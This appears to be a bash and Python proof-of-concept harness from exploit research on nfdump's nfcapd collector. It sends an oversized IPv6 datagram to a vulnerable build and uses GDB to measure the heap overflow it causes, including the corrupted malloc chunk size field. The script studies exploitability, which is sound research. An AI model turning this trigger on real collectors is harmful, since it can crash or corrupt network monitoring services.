#!/usr/bin/env bash
# nfdump2shell: measure the actual 8-byte value written past the live
# in_buff allocation, and the resulting adjacent malloc chunk size field.
# The collector is the genuine uninstrumented plain build; GDB only reads
# state, never writes memory.  The datagram is the 65527-byte v6edge packet,
# optionally with chosen 0xA5 bytes in its dummy element payload.
set -u
cd "$(dirname "$0")"
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${V6VALUE_OUT:-harness/out/v6value}
PORT=${V6VALUE_PORT:-10265}
MODE=${V6VALUE_MODE:-v6edge}

if ! command -v gdb >/dev/null 2>&1; then
    echo "FAIL gdb required for live value measurement"
    exit 2
fi
if [ ! -x "$VP/nfcapd/.libs/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT"
DIR=$(mktemp -d "${TMPDIR:-/tmp}/nfd-v6value.XXXXXX") || exit 2
trap 'rm -rf "$DIR"' EXIT
mkdir -p "$DIR/flows"
CMD="$DIR/gdb.cmd"
cat >"$CMD" <<EOF
set pagination off
set confirm off
set breakpoint pending on
break nfd_raw.c:256
commands
 silent
 printf "=== BEFORE_STORE ===\\n"
 set \$gbuf = (char *)in_buff
 set \$gchunk = (*(unsigned long *)(\$gbuf - 8) & ~7)
 set \$ghdr = \$gbuf - 16 + \$gchunk
 set \$gtarget = \$gbuf + 65543
 printf "MSEC=%lu MSEC_HEX=%016lx\\n", (unsigned long)msecReceived, (unsigned long)msecReceived
 printf "FS_TV_SEC=%ld FS_TV_USEC=%ld\\n", (long)fs->received.tv_sec, (long)fs->received.tv_usec
 printf "HDR_SIZE_BEFORE=%016lx\\n", *(unsigned long *)(\$ghdr + 8)
 printf "PKT_TAIL=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\\n", *(unsigned char *)(in_buff+65511), *(unsigned char *)(in_buff+65512), *(unsigned char *)(in_buff+65513), *(unsigned char *)(in_buff+65514), *(unsigned char *)(in_buff+65515), *(unsigned char *)(in_buff+65516), *(unsigned char *)(in_buff+65517), *(unsigned char *)(in_buff+65518), *(unsigned char *)(in_buff+65519), *(unsigned char *)(in_buff+65520), *(unsigned char *)(in_buff+65521), *(unsigned char *)(in_buff+65522), *(unsigned char *)(in_buff+65523), *(unsigned char *)(in_buff+65524), *(unsigned char *)(in_buff+65525), *(unsigned char *)(in_buff+65526)
 continue
end
break nfd_raw.c:259
commands
 silent
 printf "=== AFTER_STORE ===\\n"
 printf "TARGET_BYTES=%02x%02x%02x%02x%02x%02x%02x%02x\\n", *(unsigned char *)(\$gtarget+0), *(unsigned char *)(\$gtarget+1), *(unsigned char *)(\$gtarget+2), *(unsigned char *)(\$gtarget+3), *(unsigned char *)(\$gtarget+4), *(unsigned char *)(\$gtarget+5), *(unsigned char *)(\$gtarget+6), *(unsigned char *)(\$gtarget+7)
 printf "HDR_PREV_AFTER=%016lx HDR_SIZE_AFTER=%016lx\\n", *(unsigned long *)\$ghdr, *(unsigned long *)(\$ghdr+8)
 kill
 quit
end
run -6 -b ::1 -p $PORT -M $DIR/flows -t 10
EOF

LD_LIBRARY_PATH="$PWD/src/build-vuln-plain/src/libnffile/.libs:${LD_LIBRARY_PATH:-}" \
    gdb -q -batch -x "$CMD" --args "$VP/nfcapd/.libs/nfcapd" >"$DIR/gdb.log" 2>&1 &
GDBPID=$!
sleep 2
printf 'HOST_MS=%s\n' "$(date +%s%3N)" >"$DIR/sender.log"
python3 harness/wire_send.py "$PORT" "$MODE" >>"$DIR/sender.log" 2>&1
for _ in $(seq 1 60); do
    grep -qa '=== AFTER_STORE ===' "$DIR/gdb.log" && break
    sleep 0.25
done
wait "$GDBPID" || true
cp "$DIR/gdb.log" "$OUT/gdb.log"
cp "$DIR/sender.log" "$OUT/sender.log"

MODE="$MODE" python3 - "$DIR/gdb.log" "$DIR/sender.log" <<'PY'
import os, re, sys
g = open(sys.argv[1], errors='replace').read()
s = open(sys.argv[2], errors='replace').read()
mode = os.environ.get('MODE', 'v6edge')
def one(pat, text):
    m = re.search(pat, text)
    return m.group(1) if m else None
p = 0; f = 0
def ok(name, cond, detail=''):
    global p, f
    if cond:
        print('PASS %s%s' % (name, (' ' + detail) if detail else '')); p += 1
    else:
        print('FAIL %s%s' % (name, (' ' + detail) if detail else '')); f += 1
msec_s = one(r'MSEC=(\d+) MSEC_HEX=([0-9a-f]+)', g)
msec_hex = one(r'MSEC=\d+ MSEC_HEX=([0-9a-f]+)', g)
host_ms = one(r'HOST_MS=(\d+)', s)
size_after = one(r'HDR_SIZE_AFTER=([0-9a-f]+)', g)
target = one(r'TARGET_BYTES=([0-9a-f]+)', g)
pkt_tail = one(r'PKT_TAIL=([0-9a-f]+)', g)
ok('live breakpoint reached before the store', '=== BEFORE_STORE ===' in g)
ok('live breakpoint reached after the store', '=== AFTER_STORE ===' in g)
ok('packet is the 65527-byte v6 datagram', 'WIRE_LEN=65527' in s)
ok('sender mode matches request', 'WIRE_MODE=%s' % mode in s)
if pkt_tail and mode == 'v6edge-marker':
    ok('chosen 0xA5 bytes are present in the packet', pkt_tail.startswith('a5'*12),
       'PKT_TAIL=%s' % pkt_tail)
ok('written word and host clock both observed', bool(msec_s and host_ms),
   'MSEC=%s HOST_MS=%s' % (msec_s, host_ms))
if msec_s and host_ms:
    delta = abs(int(msec_s) - int(host_ms))
    ok('written word is wall-clock milliseconds', delta <= 10000,
       'delta_ms=%d' % delta)
    ok('written word is current-epoch scale', 10**12 < int(msec_s) < 2*10**12,
       'value=%s' % msec_s)
if pkt_tail and msec_hex:
    le = int(msec_hex, 16).to_bytes(8, 'little').hex()
    ok('written word is not copied from packet bytes', le not in pkt_tail,
       'expected_absent=%s PKT_TAIL=%s' % (le, pkt_tail))
if msec_hex and target:
    le = int(msec_hex, 16).to_bytes(8, 'little').hex()
    ok('observed 8 heap bytes equal the msecReceived word', le == target,
       'expected=%s observed=%s' % (le, target))
if msec_hex and size_after:
    predicted = (int(msec_hex, 16) >> 8) & ((1 << 56) - 1)
    ok('next chunk size field is the clock word shifted by 7 bytes',
       predicted == int(size_after, 16),
       'predicted=%016x observed=%s' % (predicted, size_after))
    ok('resulting chunk size is far above any small useful size',
       int(size_after, 16) > 2**32, 'size=%s' % size_after)
    ok('chunk-size high byte beyond epoch range stays zero',
       int(size_after, 16) >> 48 == 0, 'high=%x' % (int(size_after, 16) >> 48))
print('TOTAL: %d PASS / %d FAIL' % (p, f))
sys.exit(1 if f else 0)
PY
